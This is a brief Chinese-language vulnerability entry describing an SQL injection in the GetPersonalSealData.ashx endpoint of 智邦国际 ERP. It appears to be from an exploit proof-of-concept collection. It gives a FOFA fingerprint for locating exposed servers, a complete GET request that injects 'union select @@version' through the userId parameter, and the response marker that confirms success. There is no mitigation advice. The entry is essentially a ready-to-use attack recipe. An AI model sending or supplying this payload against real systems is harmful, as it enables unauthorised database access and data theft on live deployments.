# 智邦国际ERPGetPersonalSealData.ashx接口SQL注入漏洞

智邦国际ERPGetPersonalSealData.ashx接口 ｜ SQL注入 ｜ —
- **指纹**：`fofa：icon_hash="-682445886"`
- **请求**：`GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1`
- **响应特征**：200 SealData